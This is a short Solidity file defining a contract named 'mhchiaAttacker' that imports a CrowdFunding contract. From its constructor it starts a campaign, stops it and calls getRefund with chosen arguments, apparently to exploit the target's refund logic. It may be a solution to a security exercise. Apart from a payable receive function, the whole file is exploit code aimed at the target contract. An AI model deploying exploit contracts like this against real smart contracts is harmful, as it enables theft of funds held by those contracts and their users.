pragma solidity 0.8.4;

import "./CrowdFunding.sol";

contract mhchiaAttacker {
    
    constructor(CrowdFunding instance) payable {
        require(msg.value > 2 wei);
        instance.startCampaign{value: 1 wei}();
        instance.stopCampaign(0);
        instance.getRefund{value: 1 wei}(0, 0);
    }

    receive() external payable { }

}